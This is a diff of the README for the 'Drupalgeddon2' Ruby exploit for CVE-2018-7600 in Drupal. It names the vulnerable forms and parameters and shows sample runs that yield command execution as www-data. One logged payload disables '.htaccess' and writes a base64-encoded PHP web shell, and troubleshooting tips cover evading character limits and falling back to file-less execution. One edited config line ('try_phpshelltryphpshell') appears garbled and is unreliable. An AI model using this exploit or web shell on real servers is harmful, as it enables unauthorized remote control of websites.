@@ -1,21 +1,22 @@
-# CVE-2018-7600 | Drupal < 7.58 / 8.x < 8.3.9 / 8.4.x < 8.4.6 / 8.5.x < 8.5.1 - 'Drupalgeddon2' RCE (SA-CORE-2018-002)
+# CVE-2018-7600 | Drupal 8.5.x < 8.5.1 / 8.4.x < 8.4.6 / 8.x < 8.3.9 / 7.x? < 7.58 / < 6.x? - 'Drupalgeddon2' RCE (SA-CORE-2018-002)
 
 [Drupalggedon2 ~ https://github.com/dreadlocked/Drupalgeddon2/](https://github.com/dreadlocked/Drupalgeddon2/) _([https://www.drupal.org/sa-core-2018-002](https://www.drupal.org/sa-core-2018-002))_
 
 Supports:
 - Drupal **< 8.3.9** / **< 8.4.6** / **< 8.5.1** ~ `user/register` URL, attacking `account/mail` & `#post_render` parameter, using PHP's `passthru` function
 - Drupal **< 7.58** ~ `user/password` URL, attacking `triggering_element_name` form & `#post_render` parameter, using PHP's `passthru` function
-- **Direct commands** or Write a **PHP shell** to the web root (`./`) or sub-directories (`./sites/default/` & `./sites/default/files/`)
-- **Windows** & **Linux** support
+- Works with **direct commands** (aka File-Less Method) or writes a **PHP shell** to the web root (`./`) or sub-directories (`./sites/default/` & `./sites/default/files/`)
+- Support **Linux** & **Windows** targets
+- **Auto detects Drupal version** _(or takes a good guess!)_
 
-The `user/register` method was chosen for Drupal v8.x, as it will return `HTTP 200`, and render the output in the `data` JSON response _(un-comment the code for `timezone`/`#lazy_builder` method, which will return `HTTP 500` & blind!)_ _([More Information](https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708))_.
+The `user/register` method was chosen for Drupal v8.x, as it will return `HTTP 200`, and render the output in the `data` JSON response _(un-comment the code for `timezone`/`#lazy_builder` method, which will return `HTTP 500` & blind!)_ _([More Information](https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708))_
 
 Authors:
 - [Hans Topo](https://github.com/dreadlocked)  _([@\_dreadlocked](https://twitter.com/_dreadlocked))_
 - [g0tmi1k](https://blog.g0tmi1k.com/) _([@g0tmi1k](https://twitter.com/g0tmi1k))_
 
 Notes:
-- For advance users/setups there is a more customizable exploit. See the `drupalgeddon2-customizable-beta` section.
+- For advance users/setups there is a more customizable exploit. See the `drupalgeddon2-customizable-beta.rb` section
 - Before opening an issue, please, read the troubleshooting section at the end. Thanks!
 
 
@@ -57,9 +58,6 @@ $ ./drupalgeddon2.rb http://localhost/drupal-8/
 [+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
 --------------------------------------------------------------------------------
 [i] Fake shell:   curl 'http://localhost/drupal-8/s.php' -d 'c=hostname'
-ubuntu140045x64-drupal>> id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-ubuntu140045x64-drupal>>
 ubuntu140045x64-drupal>> uname -a
 Linux ubuntu140045x64-drupal 3.13.0-144-generic #193-Ubuntu SMP Thu Mar 15 17:03:53 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 ubuntu140045x64-drupal>>
@@ -94,9 +92,6 @@ $ ./drupalgeddon2.rb http://localhost/drupal-7/
 ubuntu140045x64-drupal>> uptime
  14:52:33 up 4 days,  3:35,  1 user,  load average: 0.00, 0.01, 0.05
 ubuntu140045x64-drupal>>
-ubuntu140045x64-drupal>> whoami
-www-data
-ubuntu140045x64-drupal>>
 ```
 
 
@@ -105,7 +100,7 @@ ubuntu140045x64-drupal>>
 If either you do not want to even try and write a PHP web shell to the web server, edit the file as shown _(it will fall back if it can't find a writeable location anyway)_:
 
 ```ruby
-writeshell = false
+try_phpshelltryphpshell = false
 ```
 
 **Example**
@@ -136,13 +131,13 @@ $ ./drupalgeddon2.rb http://localhost/drupal-nonwrite/
 [!] Target is NOT exploitable for some reason [2] (HTTP Response: 404)...    Might not have write access?
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 [*] Testing: Writing To Web Root (sites/default/files/)
-[i] Moving : ./sites/default/files/.htaccess
+[*] Moving : ./sites/default/files/.htaccess
 [i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/s.php
 [+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
 [!] Target is NOT exploitable for some reason [1] (HTTP Response: 403)...    May not be able to execute PHP from here?
 [!] FAILED: Couldn't find writeable web path
 --------------------------------------------------------------------------------
-[*] Dropping back direct commands
+[*] Dropping back to direct commands
 drupalgeddon2>> lsb_release -a
 Distributor ID:	Ubuntu
 Description:	Ubuntu 14.04.5 LTS
@@ -165,17 +160,17 @@ proxy_port = 8080
 - - -
 
 
-#### Experimental but usable: drupalgeddon2-customizable-beta
+#### Experimental but usable: drupalgeddon2-customizable-beta.rb
 
-`drupalgeddon2-customizable-beta` is intended for more advance users as its more customizable. It allows you to specify some more parameters as the PHP method to use (not only `system()` or `passthru()`) and the way to reach user/password form.
+`drupalgeddon2-customizable-beta.rb` is intended for more advance users as its more customizable. It allows you to specify some more parameters as the PHP method to use (not only `system()` or `passthru()`) and the way to reach user/password form.
 
 Usage examples:
 
 ```
-$ ruby drupalgeddon2-customizable-beta https://example.com 7 id passthru 0
+$ ruby drupalgeddon2-customizable-beta.rb https://example.com 7 id passthru 0
 
 1st parameter: Target URL
-2nd parameter: Drupal version
+2nd parameter: Drupal version (e.g. 7 or 8)
 3rd parameter: Command
 4th parameter: PHP method to use (e.g. passthru, exec, system, assert...)
 5th parameter: 0 for "/?q=user/password", 1 for "/user/password"
@@ -187,8 +182,26 @@ $ ruby drupalgeddon2-customizable-beta https://example.com 7 id passthru 0
 
 ## Troubleshooting:
 
-- Sometimes, websites may redirect to another path where Drupal exists (such as `30x` responses). Solution: Make sure you are using the correct Drupal path.
-- Drupal v7.x - If `/user/password` form is disabled, maybe you should find another form, but remember to change the exploit. Solution: `form_id` parameter will change depending on the form used to exploit the vulnerability.
+- The target may redirect to another path, where Drupal exists (such as `HTTP 30x` responses)
+    - Solution: Make sure you are using the correct Drupal path
+
+- There is a limitations of a allowed characters that are able to be used in the payload/command
+    - Solution: This is due to how the vulnerability sees them and them being encoded for the URL request. Encode the payload, decode it on the target. Such as base64
+
+- If the target is Linux, and isn't using "GNU base64", it may be the BSD version _(or its not installed all together!)_
+    - Solution: which to `base64 -D` (rather than `base64 -d`) or use the file-less method
+
+- If the target using Windows, writing the PHP shell always fails
+    - Solution: Use file-less method. This is because gets pipe to a unix program, rather than using `certutil` or `PowerShell`
+
+- Drupal v8.x - `./.htaccess` will stop any PHP scripts from executing in `./sites/default/` if that is the writeable folder
+    - Solution: Switch to the file-less method
+
+- Drupal v8.x - "clean URL" isn't enabled on the target
+    - Solution: N/A - Not vulnerable =(
+
+- Drupal v7.x - If the `/user/password` form is disabled, you meed find another form _(remember to change the exploit!)_
+    - Solution: `form_id` parameter will change depending on the form used to exploit the vulnerability
 
 
 - - -
